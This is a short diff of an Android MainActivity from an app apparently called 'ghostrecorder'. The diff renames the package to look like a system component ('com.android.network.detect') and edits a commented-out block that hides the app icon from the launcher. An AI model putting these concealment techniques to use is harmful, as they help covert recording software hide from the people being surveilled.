@@ -1,4 +1,4 @@
-package com.byteshaft.ghostrecorder;
+package com.android.network.detect;
 
 import android.app.Activity;
 import android.content.SharedPreferences;
@@ -12,11 +12,6 @@ import android.widget.CompoundButton;
 import android.widget.EditText;
 import android.widget.Switch;
 import android.widget.Toast;
-
-import java.text.SimpleDateFormat;
-import java.util.Calendar;
-import java.util.Locale;
-import java.util.TimeZone;
 
 public class MainActivity extends Activity implements Switch.OnCheckedChangeListener,
         View.OnClickListener {
@@ -84,7 +79,7 @@ public class MainActivity extends Activity implements Switch.OnCheckedChangeList
                     /// hide app icon form  app drawer
 //                    PackageManager packageManager = getPackageManager();
 //                    ComponentName componentName = new ComponentName(getApplicationContext(),
-//                            com.byteshaft.ghostrecorder.MainActivity.class);
+//                            MainActivity.class);
 //                    packageManager.setComponentEnabledSetting(componentName,
 //                            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
 //                            PackageManager.DONT_KILL_APP);
